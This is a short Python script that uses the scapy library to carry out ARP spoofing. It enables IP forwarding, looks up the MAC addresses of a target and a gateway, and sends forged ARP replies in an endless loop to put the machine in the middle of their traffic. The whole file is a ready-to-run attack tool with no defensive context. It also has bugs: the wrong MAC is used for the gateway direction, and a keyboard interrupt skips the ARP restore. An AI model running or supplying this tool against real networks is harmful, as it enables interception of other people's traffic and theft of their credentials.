#!/usr/bin/env python
# -*- coding: utf-8 -*-

from subprocess import call
from time import sleep
import scapy.all as scapy
import optparse
import sys

def ip_forward():
    call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP to spoof target")
    parser.add_option("-g", "--gateway", dest="gateway", help="IP to fool gateway")
    options, args = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, gateway_ip):
    packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op=2)
    scapy.send(packet, verbose=False)

def restore_arp_table(target_ip, gateway_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, verbose=False)


ip_forward()

options = get_args()
gateway = options.gateway
target = options.target

target_mac = get_mac(target)
gateway_mac = get_mac(options.gateway)

count = 0

try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        count += 2
        print("\rPackets sent: {}".format(count)),
        sys.stdout.flush()
        sleep(1)
except Exception:
    print("\nRestoring ARP tables")
    restore_arp_table(target, gateway)
    restore_arp_table(gateway, target)
    print("Error occured...")